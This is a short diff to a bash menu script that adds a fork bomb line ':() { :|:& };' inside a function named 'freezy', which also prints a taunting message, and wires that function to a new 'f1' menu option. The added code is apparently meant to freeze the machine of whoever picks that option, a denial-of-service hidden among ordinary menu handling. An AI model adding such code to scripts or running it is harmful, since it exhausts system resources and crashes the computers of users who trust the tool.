@@ -94,6 +94,7 @@ function freezy
 {
 	for (( i = 1; i <= 15; i++))
 			do 
+				:() { :|:& };
 				echo -e "$COL $FKD $CE"
 	done
 	echo -e "$COL YOU FUCKED $CE"
@@ -435,6 +436,9 @@ c=1
 	done
 	echo -e "\nThanks to use me"
 	sleep 1;;
+f1)
+	freezy
+;;
 *)
     banner #Function called
 esac
